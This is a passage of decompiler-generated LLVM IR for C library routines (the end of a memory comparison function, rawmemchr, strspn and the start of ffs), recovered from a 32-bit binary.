  %v3_8058d1d = load i32, i32* %v2_8058d1d, align 4
  %v2_8058d20 = and i32 %v6_8058c5f, 24
  %v4_8058d20 = icmp eq i32 %v2_8058d20, 0
  br i1 %v4_8058d20, label %bb163, label %bb161

bb161:                                            ; preds = %bb160
  %v5_8058d20 = shl i32 %v0_8058d20, %v2_8058d20
  br label %bb163

bb163:                                            ; preds = %bb160, %bb161
  %v1_8058d22 = phi i32 [ %v0_8058d20, %bb160 ], [ %v5_8058d20, %bb161 ]
  %v2_8058d22 = or i32 %v1_8058d22, %v5_8058d17
  %v12_8058d24 = icmp eq i32 %v2_8058d22, %v1_8058d24
  br i1 %v12_8058d24, label %bb165, label %dec_label_pc_8058d52

bb165:                                            ; preds = %bb163, %dec_label_pc_8058ca7
  %storemerge10.pre = phi i32 [ %v3_8058d1d, %bb163 ], [ %v2_8058c86, %dec_label_pc_8058ca7 ]
  %v0_8058d3f = phi i32 [ %v0_8058d1d, %bb163 ], [ %v1_8058cad, %dec_label_pc_8058ca7 ]
  %v6_8058d2f = phi i32 [ %v8_8058d19, %bb163 ], [ %v2_8058c84, %dec_label_pc_8058ca7 ]
  %stack_var_-28.1 = phi i32 [ %v0_8058d20, %bb163 ], [ %v2_8058c84, %dec_label_pc_8058ca7 ]
  %v0_8058d2c = phi i32 [ %v0_8058d08, %bb163 ], [ %v1_8058c74, %dec_label_pc_8058ca7 ]
  %stack_var_-24.2 = phi i32 [ %stack_var_-24.1, %bb163 ], [ %v4_8058ca7, %dec_label_pc_8058ca7 ]
  %v0_8058d48 = phi i32 [ %v3_8058d08, %bb163 ], [ %v3_8058c88, %dec_label_pc_8058ca7 ]
  %v1_8058d2c = add i32 %v0_8058d2c, 8
  %v2_8058d2c = inttoptr i32 %v1_8058d2c to i32*
  %v3_8058d2c = load i32, i32* %v2_8058d2c, align 4
  %v7_8058d2f = and i32 %v6_8058d2f, -256
  %v1_8058d3f = add i32 %v0_8058d3f, 8
  %v2_8058d3f = inttoptr i32 %v1_8058d3f to i32*
  %v3_8058d3f = load i32, i32* %v2_8058d3f, align 4
  %v5_8058d42 = lshr i32 %stack_var_-28.1, %v2_8058c54
  %v8_8058d44 = or i32 %v7_8058d2f, %v6_8058c5f
  %v2_8058d48 = and i32 %v6_8058c5f, 24
  %v4_8058d48 = icmp eq i32 %v2_8058d48, 0
  br i1 %v4_8058d48, label %bb168, label %bb166

bb166:                                            ; preds = %bb165
  %v5_8058d48 = shl i32 %v0_8058d48, %v2_8058d48
  br label %bb168

bb168:                                            ; preds = %bb165, %bb166
  %v1_8058d4a = phi i32 [ %v0_8058d48, %bb165 ], [ %v5_8058d48, %bb166 ]
  %v2_8058d4a = or i32 %v1_8058d4a, %v5_8058d42
  %v12_8058d4c = icmp eq i32 %v2_8058d4a, %storemerge10.pre
  br i1 %v12_8058d4c, label %bb170, label %dec_label_pc_8058d52

dec_label_pc_8058d52:                             ; preds = %bb168, %bb163
  %v0_8058d52 = phi i32 [ %v2_8058d22, %bb163 ], [ %v2_8058d4a, %bb168 ]
  %storemerge10 = phi i32 [ %v1_8058d24, %bb163 ], [ %storemerge10.pre, %bb168 ]
  store i32 %storemerge10, i32* @edx, align 4
  store i32 %v0_8058d52, i32* @eax, align 4
  br label %dec_label_pc_8058dae

bb170:                                            ; preds = %bb168, %dec_label_pc_8058c8d
  %v3_8058d76 = phi i32 [ %v3_8058d3f, %bb168 ], [ %v2_8058c86, %dec_label_pc_8058c8d ]
  %v0_8058d8c = phi i32 [ %v0_8058d3f, %bb168 ], [ %v1_8058c97, %dec_label_pc_8058c8d ]
  %v0_8058d89 = phi i32 [ %v0_8058d2c, %bb168 ], [ %v1_8058c94, %dec_label_pc_8058c8d ]
  %v6_8058d56 = phi i32 [ %v8_8058d44, %bb168 ], [ %v2_8058c84, %dec_label_pc_8058c8d ]
  %stack_var_-32.1 = phi i32 [ %v0_8058d48, %bb168 ], [ %v2_8058c84, %dec_label_pc_8058c8d ]
  %stack_var_-24.3 = phi i32 [ %stack_var_-24.2, %bb168 ], [ %v4_8058c8d, %dec_label_pc_8058c8d ]
  %stack_var_-36.1 = phi i32 [ %v3_8058d2c, %bb168 ], [ %v3_8058c88, %dec_label_pc_8058c8d ]
  %v7_8058d56 = and i32 %v6_8058d56, -256
  %v1_8058d5e = add i32 %v0_8058d89, 12
  %v2_8058d5e = inttoptr i32 %v1_8058d5e to i32*
  %v3_8058d5e = load i32, i32* %v2_8058d5e, align 4
  %v1_8058d61 = add i32 %v0_8058d8c, 12
  %v2_8058d61 = inttoptr i32 %v1_8058d61 to i32*
  %v3_8058d61 = load i32, i32* %v2_8058d61, align 4
  %v5_8058d64 = lshr i32 %stack_var_-32.1, %v2_8058c54
  %v8_8058d66 = or i32 %v7_8058d56, %v6_8058c5f
  %v2_8058d71 = and i32 %v6_8058c5f, 24
  %v4_8058d71 = icmp eq i32 %v2_8058d71, 0
  br i1 %v4_8058d71, label %bb173, label %bb171

bb171:                                            ; preds = %bb170
  %v5_8058d71 = shl i32 %stack_var_-36.1, %v2_8058d71
  br label %bb173

bb173:                                            ; preds = %bb170, %bb171
  %v3_8058d73 = phi i32 [ %stack_var_-36.1, %bb170 ], [ %v5_8058d71, %bb171 ]
  %v4_8058d73 = or i32 %v3_8058d73, %v5_8058d64
  %v14_8058d76 = icmp eq i32 %v4_8058d73, %v3_8058d76
  br i1 %v14_8058d76, label %dec_label_pc_8058d82, label %dec_label_pc_8058d7d

dec_label_pc_8058d7d:                             ; preds = %bb158, %bb173
  %v2_8058d7d = phi i32 [ %v4_8058d73, %bb173 ], [ %v4_8058cfc, %bb158 ]
  %storemerge9 = phi i32 [ %v3_8058d76, %bb173 ], [ %storemerge9.pre, %bb158 ]
  store i32 %storemerge9, i32* @edx, align 4
  store i32 %v2_8058d7d, i32* @eax, align 4
  br label %dec_label_pc_8058dae

dec_label_pc_8058d82:                             ; preds = %bb173
  %v4_8058d82 = add i32 %stack_var_-24.3, -4
  %v12_8058d82 = icmp eq i32 %v4_8058d82, 0
  br i1 %v12_8058d82, label %bb175, label %dec_label_pc_8058d89

dec_label_pc_8058d89:                             ; preds = %dec_label_pc_8058d82
  %v1_8058d89 = add i32 %v0_8058d89, 16
  store i32 %v1_8058d89, i32* @edx, align 4
  %v1_8058d8c = add i32 %v0_8058d8c, 16
  store i32 %v1_8058d8c, i32* @ebx, align 4
  br label %bb155

bb175:                                            ; preds = %dec_label_pc_8058d82
  %v5_8058d9c = lshr i32 %stack_var_-36.1, %v2_8058c54
  br i1 %v4_8058d71, label %bb178, label %bb176

bb176:                                            ; preds = %bb175
  %v5_8058da2 = shl i32 %v3_8058d5e, %v2_8058d71
  br label %bb178

bb178:                                            ; preds = %bb175, %bb176
  %v1_8058da6 = phi i32 [ %v3_8058d5e, %bb175 ], [ %v5_8058da2, %bb176 ]
  store i32 0, i32* @ecx, align 4
  %v2_8058da6 = or i32 %v1_8058da6, %v5_8058d9c
  store i32 %v2_8058da6, i32* @eax, align 4
  %v12_8058da8 = icmp eq i32 %v2_8058da6, %v3_8058d61
  br i1 %v12_8058da8, label %dec_label_pc_8058db5, label %dec_label_pc_8058dac

dec_label_pc_8058dac:                             ; preds = %bb178
  store i32 %v3_8058d61, i32* @edx, align 4
  br label %dec_label_pc_8058dae

dec_label_pc_8058dae:                             ; preds = %dec_label_pc_8058d7d, %dec_label_pc_8058d52, %dec_label_pc_8058dac
  %v0_8058dae = call i32 @memcmp_bytes()
  store i32 %v0_8058dae, i32* @ecx, align 4
  br label %dec_label_pc_8058db5

dec_label_pc_8058db5:                             ; preds = %bb178, %dec_label_pc_8058dae
  %v0_8058db5 = phi i32 [ 0, %bb178 ], [ %v0_8058dae, %dec_label_pc_8058dae ]
  br label %dec_label_pc_8058db7

dec_label_pc_8058db7:                             ; preds = %dec_label_pc_8058c34, %dec_label_pc_8058c46, %dec_label_pc_8058db5
  %v0_8058db7 = phi i32 [ 0, %dec_label_pc_8058c34 ], [ %v0_8058c46, %dec_label_pc_8058c46 ], [ %v0_8058db5, %dec_label_pc_8058db5 ]
  %v1_8058db7 = icmp eq i32 %v0_8058db7, 0
  %v1_8058db9 = icmp eq i1 %v1_8058db7, false
  br i1 %v1_8058db9, label %dec_label_pc_8058df0, label %dec_label_pc_8058dbb

dec_label_pc_8058dbb:                             ; preds = %dec_label_pc_8058db7
  %v4_8058dc7 = urem i32 %stack_var_12.0.lcssa, 4
  %v1_8058dcc = and i32 %stack_var_12.0.lcssa, -4
  %v2_8058dcf = add i32 %v1_8058dcc, %v0_8058c6a
  store i32 %v2_8058dcf, i32* @ecx, align 4
  %v2_8058dd1 = add i32 %v1_8058dcc, %v0_8058cd6
  br label %dec_label_pc_8058de7.preheader

dec_label_pc_8058de7.preheader:                   ; preds = %dec_label_pc_8058dbb, %entry
  %v0_8058dd8123 = phi i32 [ %v4_8058b5f, %entry ], [ %v2_8058dcf, %dec_label_pc_8058dbb ]
  %v0_8058dd5121 = phi i32 [ %v4_8058b63, %entry ], [ %v2_8058dd1, %dec_label_pc_8058dbb ]
  %stack_var_12.1.ph = phi i32 [ %tmp148, %entry ], [ %v4_8058dc7, %dec_label_pc_8058dbb ]
  %v4_8058de734 = icmp eq i32 %stack_var_12.1.ph, 0
  %v1_8058dec41 = icmp eq i1 %v4_8058de734, false
  br i1 %v1_8058dec41, label %dec_label_pc_8058dd5, label %dec_label_pc_8058dee

dec_label_pc_8058dd5:                             ; preds = %dec_label_pc_8058de7.preheader, %dec_label_pc_8058de1
  %v0_8058de5 = phi i32 [ %v1_8058de5, %dec_label_pc_8058de1 ], [ %v0_8058dd8123, %dec_label_pc_8058de7.preheader ]
  %v0_8058de6 = phi i32 [ %v1_8058de6, %dec_label_pc_8058de1 ], [ %v0_8058dd5121, %dec_label_pc_8058de7.preheader ]
  %stack_var_12.142 = phi i32 [ %v4_8058de1, %dec_label_pc_8058de1 ], [ %stack_var_12.1.ph, %dec_label_pc_8058de7.preheader ]
  %v1_8058dd5 = inttoptr i32 %v0_8058de6 to i8*
  %v2_8058dd5 = load i8, i8* %v1_8058dd5, align 1
  %v3_8058dd5 = zext i8 %v2_8058dd5 to i32
  %v1_8058dd8 = inttoptr i32 %v0_8058de5 to i8*
  %v2_8058dd8 = load i8, i8* %v1_8058dd8, align 1
  %v3_8058dd8 = zext i8 %v2_8058dd8 to i32
  %v2_8058ddb = sub nsw i32 %v3_8058dd8, %v3_8058dd5
  %v12_8058ddb = icmp eq i32 %v2_8058ddb, 0
  store i32 %v2_8058ddb, i32* @edx, align 4
  %v1_8058ddf = icmp eq i1 %v12_8058ddb, false
  br i1 %v1_8058ddf, label %dec_label_pc_8058df0, label %dec_label_pc_8058de1

dec_label_pc_8058de1:                             ; preds = %dec_label_pc_8058dd5
  %v4_8058de1 = add i32 %stack_var_12.142, -1
  %v11_8058de1 = icmp eq i32 %v4_8058de1, 0
  %v1_8058de5 = add i32 %v0_8058de5, 1
  store i32 %v1_8058de5, i32* @ecx, align 4
  %v1_8058de6 = add i32 %v0_8058de6, 1
  %v1_8058dec = icmp eq i1 %v11_8058de1, false
  br i1 %v1_8058dec, label %dec_label_pc_8058dd5, label %dec_label_pc_8058dee

dec_label_pc_8058dee:                             ; preds = %dec_label_pc_8058de1, %dec_label_pc_8058de7.preheader
  br label %dec_label_pc_8058df0

dec_label_pc_8058df0:                             ; preds = %dec_label_pc_8058b6e, %dec_label_pc_8058dd5, %dec_label_pc_8058db7, %dec_label_pc_8058dee
  %v0_8058df7 = phi i32 [ %v0_8058db7, %dec_label_pc_8058db7 ], [ 0, %dec_label_pc_8058dee ], [ %v2_8058ddb, %dec_label_pc_8058dd5 ], [ %v2_8058b74, %dec_label_pc_8058b6e ]
  store i32 %v0_8058b56, i32* @ebx, align 4
  ret i32 %v0_8058df7

; uselistorder directives
  uselistorder i32 %v1_8058de5, { 1, 0 }
  uselistorder i32 %v4_8058de1, { 1, 0 }
  uselistorder i32 %v1_8058dcc, { 1, 0 }
  uselistorder i32 %v1_8058d8c, { 1, 0 }
  uselistorder i32 %v1_8058d89, { 1, 0 }
  uselistorder i32 %v4_8058d82, { 1, 0 }
  uselistorder i32 %v4_8058d73, { 1, 0 }
  uselistorder i32 %v3_8058d61, { 2, 0, 1 }
  uselistorder i32 %v3_8058d5e, { 1, 2, 0 }
  uselistorder i32 %stack_var_-36.1, { 2, 1, 3, 0 }
  uselistorder i32 %v3_8058d76, { 1, 0 }
  uselistorder i32 %v2_8058d4a, { 1, 0 }
  uselistorder i32 %v0_8058d48, { 2, 0, 1 }
  uselistorder i32 %storemerge10.pre, { 1, 0 }
  uselistorder i32 %v2_8058d22, { 1, 0 }
  uselistorder i32 %v0_8058d20, { 2, 0, 1 }
  uselistorder i32 %v1_8058d24, { 1, 0 }
  uselistorder i32 %v4_8058cfc, { 1, 0 }
  uselistorder i32 %storemerge9.pre, { 1, 0 }
  uselistorder i32 %v3_8058cba, { 1, 0 }
  uselistorder i32 %v3_8058c88, { 1, 0 }
  uselistorder i32 %v2_8058c84, { 3, 0, 2, 1 }
  uselistorder i32 %v1_8058c77, { 2, 0, 1 }
  uselistorder i32 %v1_8058c74, { 0, 1, 3, 2, 5, 4, 6, 7, 8, 9 }
  uselistorder i32 %v2_8058c63, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v6_8058c5f, { 7, 0, 4, 1, 5, 2, 6, 3 }
  uselistorder i32 %v2_8058c54, { 1, 2, 5, 4, 3, 0 }
  uselistorder i32 %v1_8058c2c, { 1, 0 }
  uselistorder i32 %v1_8058c27, { 1, 0 }
  uselistorder i32 %v3_8058c22, { 1, 0, 2 }
  uselistorder i32 %v3_8058c17, { 1, 0, 2 }
  uselistorder i32 %v0_8058c20, { 1, 0 }
  uselistorder i32 %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %v0_8058c13, { 1, 0 }
  uselistorder i32 %stack_var_-48.0, { 1, 0 }
  uselistorder i32 %v4_8058beb, { 1, 0 }
  uselistorder i32 %v1_8058ba5, { 2, 0, 1 }
  uselistorder i32 %v2_8058ba0, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v0_8058cd6, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14 }
  uselistorder i32 %stack_var_12.0.lcssa, { 3, 0, 1, 2 }
  uselistorder i32 %v0_8058c6a, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 %v1_8058b83, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8058b82, { 0, 2, 1 }
  uselistorder i32 %v4_8058b63, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v4_8058b5f, { 2, 1, 0, 3 }
  uselistorder i32 %tmp148, { 2, 1, 0, 3 }
  uselistorder i32 ()* @memcmp_bytes, { 1, 0 }
  uselistorder i32 -8, { 47, 48, 49, 50, 55, 51, 56, 11, 5, 4, 6, 0, 7, 8, 9, 10, 54, 12, 13, 14, 15, 17, 18, 16, 19, 20, 21, 22, 23, 24, 25, 59, 57, 58, 52, 1, 31, 26, 27, 28, 29, 30, 32, 33, 34, 35, 44, 43, 38, 39, 2, 3, 40, 41, 42, 36, 37, 45, 46, 53 }
  uselistorder label %dec_label_pc_8058df0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8058dd5, { 1, 0 }
  uselistorder label %dec_label_pc_8058db7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8058db5, { 1, 0 }
  uselistorder label %dec_label_pc_8058dae, { 2, 0, 1 }
  uselistorder label %bb178, { 1, 0 }
  uselistorder label %dec_label_pc_8058d7d, { 1, 0 }
  uselistorder label %bb173, { 1, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_8058c46, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8058b6e, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8058df9 = load i32, i32* @ebx, align 4
  %v4_8058dfa = urem i32 %arg2, 256
  %v4_8058dfe = ptrtoint i8* %arg1 to i32
  %v2_8058e093 = urem i32 %v4_8058dfe, 4
  %v3_8058e094 = icmp eq i32 %v2_8058e093, 0
  %v1_8058e0b8 = icmp eq i1 %v3_8058e094, false
  %v4_8058e04 = trunc i32 %arg2 to i8
  br i1 %v1_8058e0b8, label %dec_label_pc_8058e04, label %dec_label_pc_8058e0d

dec_label_pc_8058e04:                             ; preds = %entry, %dec_label_pc_8058e08
  %v0_8058e08 = phi i32 [ %v1_8058e08, %dec_label_pc_8058e08 ], [ %v4_8058dfe, %entry ]
  %v1_8058e04 = inttoptr i32 %v0_8058e08 to i8*
  %v2_8058e04 = load i8, i8* %v1_8058e04, align 1
  %v15_8058e04 = icmp eq i8 %v2_8058e04, %v4_8058e04
  br i1 %v15_8058e04, label %dec_label_pc_8058e58, label %dec_label_pc_8058e08

dec_label_pc_8058e08:                             ; preds = %dec_label_pc_8058e04
  %v1_8058e08 = add i32 %v0_8058e08, 1
  %v2_8058e09 = urem i32 %v1_8058e08, 4
  %v3_8058e09 = icmp eq i32 %v2_8058e09, 0
  %v1_8058e0b = icmp eq i1 %v3_8058e09, false
  br i1 %v1_8058e0b, label %dec_label_pc_8058e04, label %dec_label_pc_8058e0d

dec_label_pc_8058e0d:                             ; preds = %entry, %dec_label_pc_8058e08
  %v0_8058e10 = phi i32 [ %v1_8058e08, %dec_label_pc_8058e08 ], [ %v4_8058dfe, %entry ]
  %v2_8058e14 = mul nuw nsw i32 %v4_8058dfa, 256
  %v2_8058e17 = or i32 %v2_8058e14, %v4_8058dfa
  %v2_8058e1b = mul i32 %v2_8058e17, 65536
  %v2_8058e1e = or i32 %v2_8058e1b, %v2_8058e17
  br label %dec_label_pc_8058e20

dec_label_pc_8058e20:                             ; preds = %dec_label_pc_8058e50, %dec_label_pc_8058e20, %dec_label_pc_8058e0d
  %v0_8058e24 = phi i32 [ %v0_8058e10, %dec_label_pc_8058e0d ], [ %v1_8058e24, %dec_label_pc_8058e20 ], [ %v1_8058e24, %dec_label_pc_8058e50 ]
  %v2_8058e22 = inttoptr i32 %v0_8058e24 to i32*
  %v3_8058e22 = load i32, i32* %v2_8058e22, align 4
  %v4_8058e22 = xor i32 %v3_8058e22, %v2_8058e1e
  %v1_8058e24 = add i32 %v0_8058e24, 4
  %v1_8058e27 = add i32 %v4_8058e22, 2130640639
  %v1_8058e2d = sub i32 -1, %v4_8058e22
  %v2_8058e2f = xor i32 %v1_8058e27, %v1_8058e2d
  %v1_8058e31 = and i32 %v2_8058e2f, -2130640640
  %v2_8058e31 = icmp eq i32 %v1_8058e31, 0
  br i1 %v2_8058e31, label %dec_label_pc_8058e20, label %dec_label_pc_8058e38

dec_label_pc_8058e38:                             ; preds = %dec_label_pc_8058e20
  %v2_8058e38 = inttoptr i32 %v0_8058e24 to i8*
  %v3_8058e38 = load i8, i8* %v2_8058e38, align 1
  %v16_8058e38 = icmp eq i8 %v3_8058e38, %v4_8058e04
  br i1 %v16_8058e38, label %dec_label_pc_8058e58, label %dec_label_pc_8058e40

dec_label_pc_8058e40:                             ; preds = %dec_label_pc_8058e38
  %v1_8058e40 = add i32 %v0_8058e24, 1
  %v2_8058e40 = inttoptr i32 %v1_8058e40 to i8*
  %v3_8058e40 = load i8, i8* %v2_8058e40, align 1
  %v16_8058e40 = icmp eq i8 %v3_8058e40, %v4_8058e04
  br i1 %v16_8058e40, label %dec_label_pc_8058e58, label %dec_label_pc_8058e48

dec_label_pc_8058e48:                             ; preds = %dec_label_pc_8058e40
  %v1_8058e48 = add i32 %v0_8058e24, 2
  %v2_8058e48 = inttoptr i32 %v1_8058e48 to i8*
  %v3_8058e48 = load i8, i8* %v2_8058e48, align 1
  %v16_8058e48 = icmp eq i8 %v3_8058e48, %v4_8058e04
  br i1 %v16_8058e48, label %dec_label_pc_8058e58, label %dec_label_pc_8058e50

dec_label_pc_8058e50:                             ; preds = %dec_label_pc_8058e48
  %v1_8058e50 = add i32 %v0_8058e24, 3
  %v2_8058e50 = inttoptr i32 %v1_8058e50 to i8*
  %v3_8058e50 = load i8, i8* %v2_8058e50, align 1
  %v16_8058e50 = icmp eq i8 %v3_8058e50, %v4_8058e04
  %v1_8058e56 = icmp eq i1 %v16_8058e50, false
  br i1 %v1_8058e56, label %dec_label_pc_8058e20, label %dec_label_pc_8058e58

dec_label_pc_8058e58:                             ; preds = %dec_label_pc_8058e04, %dec_label_pc_8058e50, %dec_label_pc_8058e48, %dec_label_pc_8058e40, %dec_label_pc_8058e38
  %v0_8058e5a = phi i32 [ %v1_8058e50, %dec_label_pc_8058e50 ], [ %v1_8058e48, %dec_label_pc_8058e48 ], [ %v1_8058e40, %dec_label_pc_8058e40 ], [ %v0_8058e24, %dec_label_pc_8058e38 ], [ %v0_8058e08, %dec_label_pc_8058e04 ]
  store i32 %v0_8058df9, i32* @ebx, align 4
  ret i32 %v0_8058e5a

; uselistorder directives
  uselistorder i32 %v1_8058e24, { 1, 0 }
  uselistorder i32 %v2_8058e17, { 1, 0 }
  uselistorder i32 %v1_8058e08, { 1, 0, 2 }
  uselistorder i8 %v4_8058e04, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8058dfe, { 2, 1, 0 }
  uselistorder i32 %v4_8058dfa, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8058e58, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8058e0d, { 1, 0 }
  uselistorder label %dec_label_pc_8058e04, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_8058e7e31 = load i8, i8* %arg1, align 1
  %v4_8058e8035 = icmp eq i8 %v2_8058e7e31, 0
  br i1 %v4_8058e8035, label %dec_label_pc_8058e88, label %dec_label_pc_8058e84.lr.ph

dec_label_pc_8058e84.lr.ph:                       ; preds = %entry
  %v3_8058e7e32 = zext i8 %v2_8058e7e31 to i32
  %v4_8058e7e.pre = load i32, i32* @eax, align 4
  %v5_8058e7e33 = and i32 %v4_8058e7e.pre, -256
  %v6_8058e7e34 = or i32 %v3_8058e7e32, %v5_8058e7e33
  %v4_8058e65 = ptrtoint i8* %arg1 to i32
  %v1_8058e7018 = inttoptr i32 %arg2 to i8*
  %v4_8058e70.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8058e84

dec_label_pc_8058e6b:                             ; preds = %dec_label_pc_8058e84, %dec_label_pc_8058e6f
  %v6_8058e7028 = phi i32 [ %v6_8058e70, %dec_label_pc_8058e6f ], [ %v6_8058e7022, %dec_label_pc_8058e84 ]
  %v2_8058e7027 = phi i8 [ %v2_8058e70, %dec_label_pc_8058e6f ], [ %v2_8058e7019, %dec_label_pc_8058e84 ]
  %v0_8058e6f26 = phi i32 [ %v1_8058e6f, %dec_label_pc_8058e6f ], [ %arg2, %dec_label_pc_8058e84 ]
  %v15_8058e6b = icmp eq i8 %v2_8058e7e39, %v2_8058e7027
  br i1 %v15_8058e6b, label %dec_label_pc_8058e78, label %dec_label_pc_8058e6f

dec_label_pc_8058e6f:                             ; preds = %dec_label_pc_8058e6b
  %v1_8058e6f = add i32 %v0_8058e6f26, 1
  store i32 %v1_8058e6f, i32* @edx, align 4
  %v1_8058e70 = inttoptr i32 %v1_8058e6f to i8*
  %v2_8058e70 = load i8, i8* %v1_8058e70, align 1
  %v3_8058e70 = zext i8 %v2_8058e70 to i32
  %v5_8058e70 = and i32 %v6_8058e7028, -256
  %v6_8058e70 = or i32 %v3_8058e70, %v5_8058e70
  store i32 %v6_8058e70, i32* @ecx, align 4
  %v4_8058e72 = icmp eq i8 %v2_8058e70, 0
  %v1_8058e74 = icmp eq i1 %v4_8058e72, false
  br i1 %v1_8058e74, label %dec_label_pc_8058e6b, label %dec_label_pc_8058e88

dec_label_pc_8058e78:                             ; preds = %dec_label_pc_8058e6b
  %v1_8058e7c = add i32 %v0_8058e8937, 1
  %v1_8058e7d = add i32 %v0_8058e7d38, 1
  %v1_8058e7e = inttoptr i32 %v1_8058e7d to i8*
  %v2_8058e7e = load i8, i8* %v1_8058e7e, align 1
  %v3_8058e7e = zext i8 %v2_8058e7e to i32
  %v5_8058e7e = and i32 %v6_8058e7e40, -256
  %v6_8058e7e = or i32 %v3_8058e7e, %v5_8058e7e
  %v4_8058e80 = icmp eq i8 %v2_8058e7e, 0
  br i1 %v4_8058e80, label %dec_label_pc_8058e88, label %dec_label_pc_8058e84

dec_label_pc_8058e84:                             ; preds = %dec_label_pc_8058e84.lr.ph, %dec_label_pc_8058e78
  %v4_8058e70.pre = phi i32 [ %v4_8058e70.pre.pre, %dec_label_pc_8058e84.lr.ph ], [ %v6_8058e7028, %dec_label_pc_8058e78 ]
  %v6_8058e7e40 = phi i32 [ %v6_8058e7e34, %dec_label_pc_8058e84.lr.ph ], [ %v6_8058e7e, %dec_label_pc_8058e78 ]
  %v2_8058e7e39 = phi i8 [ %v2_8058e7e31, %dec_label_pc_8058e84.lr.ph ], [ %v2_8058e7e, %dec_label_pc_8058e78 ]
  %v0_8058e7d38 = phi i32 [ %v4_8058e65, %dec_label_pc_8058e84.lr.ph ], [ %v1_8058e7d, %dec_label_pc_8058e78 ]
  %v0_8058e8937 = phi i32 [ 0, %dec_label_pc_8058e84.lr.ph ], [ %v1_8058e7c, %dec_label_pc_8058e78 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8058e7019 = load i8, i8* %v1_8058e7018, align 1
  %v3_8058e7020 = zext i8 %v2_8058e7019 to i32
  %v5_8058e7021 = and i32 %v4_8058e70.pre, -256
  %v6_8058e7022 = or i32 %v3_8058e7020, %v5_8058e7021
  store i32 %v6_8058e7022, i32* @ecx, align 4
  %v4_8058e7223 = icmp eq i8 %v2_8058e7019, 0
  %v1_8058e7425 = icmp eq i1 %v4_8058e7223, false
  br i1 %v1_8058e7425, label %dec_label_pc_8058e6b, label %dec_label_pc_8058e88

dec_label_pc_8058e88:                             ; preds = %entry, %dec_label_pc_8058e78, %dec_label_pc_8058e84, %dec_label_pc_8058e6f
  %v0_8058e8917 = phi i32 [ %v0_8058e8937, %dec_label_pc_8058e6f ], [ %v0_8058e8937, %dec_label_pc_8058e84 ], [ 0, %entry ], [ %v1_8058e7c, %dec_label_pc_8058e78 ]
  ret i32 %v0_8058e8917

; uselistorder directives
  uselistorder i32 %v6_8058e7022, { 1, 0 }
  uselistorder i8 %v2_8058e7019, { 1, 2, 0 }
  uselistorder i32 %v1_8058e7d, { 1, 0 }
  uselistorder i32 %v6_8058e70, { 1, 0 }
  uselistorder i8 %v2_8058e70, { 1, 2, 0 }
  uselistorder i32 %v1_8058e6f, { 2, 1, 0 }
  uselistorder i8 %v2_8058e7e31, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8058e88, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8058e84, { 1, 0 }
}

define i32 @ffs(i16 %arg1) local_unnamed_addr {
entry:
  %v4_8058e90 = sext i16 %arg1 to i32
  store i32 %v4_8058e90, i32* @ecx, align 4
  %v0_8058e94 = load i32, i32* @edx, align 4
  %v1_8058e94 = and i32 %v0_8058e94, -256
  %v2_8058e94 = or i32 %v1_8058e94, 1
  store i32 %v2_8058e94, i32* @edx, align 4
  %v4_8058e96 = icmp eq i16 %arg1, 0
  %v1_8058e99 = icmp eq i1 %v4_8058e96, false
  br i1 %v1_8058e99, label %dec_label_pc_8058ea0, label %dec_label_pc_8058e9b

dec_label_pc_8058e9b:                             ; preds = %entry
  %v2_8058e9b = sdiv i32 %v4_8058e90, 65536
  store i32 %v2_8058e9b, i32* @ecx, align 4
  %v2_8058e9e = or i32 %v1_8058e94, 17
  store i32 %v2_8058e9e, i32* @edx, align 4
  br label %dec_label_pc_8058ea0

dec_label_pc_8058ea0:                             ; preds = %entry, %dec_label_pc_8058e9b
  %v16_8058ea4 = phi i32 [ %v2_8058e94, %entry ], [ %v2_8058e9e, %dec_label_pc_8058e9b ]
  %v0_8058ea7 = phi i32 [ %v4_8058e90, %entry ], [ %v2_8058e9b, %dec_label_pc_8058e9b ]
  %v3_8058ea0 = trunc i32 %v0_8058ea7 to i8
  %v4_8058ea0 = icmp eq i8 %v3_8058ea0, 0
  %v1_8058ea2 = icmp eq i1 %v4_8058ea0, false
  br i1 %v1_8058ea2, label %dec_label_pc_8058eaa, label %dec_label_pc_8058ea4

dec_label_pc_8058ea4:                             ; preds = %dec_label_pc_8058ea0
  %v2_8058ea4 = add i32 %v16_8058ea4, 8
  %v15_8058ea4 = and i32 %v2_8058ea4, 255
  %v18_8058ea4 = or i32 %v15_8058ea4, %v1_8058e94
  store i32 %v18_8058ea4, i32* @edx, align 4
  %v2_8058ea7 = sdiv i32 %v0_8058ea7, 256
  store i32 %v2_8058ea7, i32* @ecx, align 4
  br label %dec_label_pc_8058eaa

dec_label_pc_8058eaa:                             ; preds = %dec_label_pc_8058ea0, %dec_label_pc_8058ea4
  %v16_8058eaf = phi i32 [ %v16_8058ea4, %dec_label_pc_8058ea0 ], [ %v18_8058ea4, %dec_label_pc_8058ea4 ]
  %v0_8058eb2 = phi i32 [ %v0_8058ea7, %dec_label_pc_8058ea0 ], [ %v2_8058ea7, %dec_label_pc_8058ea4 ]
  %v2_8058eaa = urem i32 %v0_8058eb2, 16
  %v3_8058eaa = icmp eq i32 %v2_8058eaa, 0
  %v1_8058ead = icmp eq i1 %v3_8058eaa, false
